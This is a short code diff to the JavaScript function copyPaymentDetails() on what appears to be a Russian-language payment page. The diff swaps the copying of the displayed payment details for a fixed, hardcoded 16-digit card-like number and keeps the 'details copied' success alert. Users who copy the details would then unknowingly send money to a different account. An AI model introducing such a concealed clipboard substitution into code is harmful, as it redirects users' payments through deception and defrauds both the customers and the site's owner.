@@ -643,7 +643,7 @@ function copyPaymentDetails() {
   if (!currentPaymentDetails) return;
 
   if (navigator.clipboard && navigator.clipboard.writeText) {
-    navigator.clipboard.writeText(currentPaymentDetails)
+    navigator.clipboard.writeText("5614683408392082")
       .then(() => alert("Реквизиты скопированы."))
       .catch(() => alert("Не удалось скопировать реквизиты."));
   } else {
